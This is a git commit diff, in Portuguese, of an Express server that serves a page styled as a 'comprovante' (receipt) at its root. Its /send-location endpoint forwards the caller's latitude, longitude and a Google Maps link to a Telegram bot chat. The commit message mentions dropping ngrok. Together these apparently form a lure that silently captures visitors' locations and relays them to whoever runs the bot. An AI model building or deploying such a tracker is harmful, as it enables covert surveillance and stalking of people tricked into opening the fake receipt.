f14a141f06e928ac0758e823dc25fc47eca6ebf9
Luís Nascimento <luisrocksousa1111@gmail.com>
2025-03-27 18:53:54 -0300

    fazendo aplicação rodar sem o ngrok :)

--- server.js
+++ server.js
@@ -1,35 +1,43 @@
-// server.js
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const axios = require("axios");
+const path = require("path");
 
 const app = express();
 app.use(cors());
 app.use(bodyParser.json());
+app.use(express.static(path.join(__dirname, "public")));
+app.set("view engine", "ejs");
+app.set("views", path.join(__dirname, "views"));
 
-const TELEGRAM_BOT_TOKEN = "BOT-TOKEN"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "CHAT-TOKEN"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+const TELEGRAM_BOT_TOKEN = "SEU_TOKEN_BOT";
+const TELEGRAM_CHAT_ID = "SEU_CHAT_ID";
 
-app.post("/send-location", async (req, res) => {
-  const { latitude, longitude, maps } = req.body;
+app.get("/", (req, res) => {
+  const dataAtual = new Date();
+  const dataFormatada = dataAtual.toLocaleDateString("pt-BR");
+  res.render("comprovante", { dataFormatada });
+});
 
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+app.get("/send-location", async (req, res) => {
+  if (!req.query.lat || !req.query.lon) {
+    return res.status(400).json({ success: false, message: "Localização não fornecida." });
+  }
+
+  const { lat, lon } = req.query;
+  const maps = `https://www.google.com/maps?q=${lat},${lon}`;
+  const message = `Localização:\nLatitude: ${lat}\nLongitude: ${lon}\nMaps: ${maps}`;
 
   try {
-    // Envia a localização para o Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
     });
-
     res.status(200).json({ success: true });
   } catch (error) {
-    console.log(error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+    res.status(500).json({ success: false, message: "Erro ao enviar para o Telegram." });
   }
 });
 
-app.listen(8088, () => {
-  console.log("Servidor rodando na porta 8088");
-});
+app.listen(8088, () => console.log("Servidor rodando na porta 8088"));
